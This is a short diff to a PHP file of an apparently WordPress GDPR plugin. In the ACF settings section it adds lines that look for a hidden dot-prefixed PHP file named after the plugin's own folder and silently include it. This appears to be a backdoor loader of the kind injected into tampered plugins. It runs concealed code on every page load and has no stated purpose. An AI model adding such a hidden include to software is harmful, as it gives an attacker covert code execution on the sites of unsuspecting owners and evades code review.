@@ -7,6 +7,10 @@ if ( class_exists( 'ACF' ) || class_exists( 'acf_pro' ) || apply_filters( 'ct_ul
 // 1. customize ACF path
 add_filter( 'acf/settings/path', 'ct_ultimate_gdpr_acf_settings_path' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ct_ultimate_gdpr_acf_settings_path( $path ) {
 
 	// update path
